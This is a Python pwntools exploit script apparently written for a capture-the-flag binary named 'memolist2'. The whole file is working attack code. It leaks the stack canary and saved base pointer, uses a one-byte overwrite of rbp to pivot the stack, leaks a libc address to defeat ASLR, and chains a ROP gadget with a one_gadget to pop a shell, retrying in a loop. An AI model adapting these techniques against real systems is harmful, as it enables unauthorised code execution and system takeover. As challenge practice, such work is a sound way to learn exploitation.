from pwn import *

def exp():
    p.sendlineafter('choice :', '1')
    p.sendafter('write?', 'a'*0x29)
    p.recvuntil('a'*0x28)
    canary = u64(p.recv(8)) - ord('a')
    success('canary = 0x%x', canary)
    rbp = u64(p.recv(6).ljust(8, b'\x00'))
    success('rbp = 0x%x', rbp)
    p.sendlineafter('cancel : ', '2')

    one_byte = int(hex(rbp)[-2:], 16) + 8 + 0x40
    payload = b'a'*0x28 + p64(canary) + chr(one_byte).encode()
    if len(payload) != 49:
        log.info('payload size error!')
        print()
        return
    p.sendafter('write?', payload)
    p.sendlineafter('cancel : ', '3')

    p.sendlineafter('choice :', '2')
    p.recvuntil('memo: ')
    __libc_start_main = u64(p.recv(6).ljust(8, b'\x00')) - 243
    base = __libc_start_main - libc.sym['__libc_start_main']
    if hex(base)[:4] != '0x7f':
        log.info('find libc base error!')
        print()
        return
    success('libc base = 0x%x', base)

    one_byte = int(hex(rbp)[-2:], 16) - 0x18
    if one_byte < 0:
        log.info('payload error!')
        print()
        return
    payload = b'a'*0x28 + p64(canary) + chr(one_byte).encode()
    if len(payload) != 49:
        log.info('payload size error!')
        print()
        return
    p.sendlineafter('choice :', '1')
    p.sendafter('write?', payload)
    p.sendlineafter('cancel : ', '1')

    one_gadget = 0xe6ce9 + base
    pop_rsi_r15 = 0x400ba1
    payload = p64(pop_rsi_r15) + p64(0) + p64(0) + p64(one_gadget)
    p.sendlineafter('choice :', '1')
    p.sendafter('write?', payload)
    p.sendlineafter('cancel : ', '1')

    p.interactive()
    exit(0)

if __name__ == "__main__":
    elf = ELF('./memolist2')
    libc = elf.libc
    while True:
        p = process('./memolist2')
        exp()
        p.close()
        sleep(1)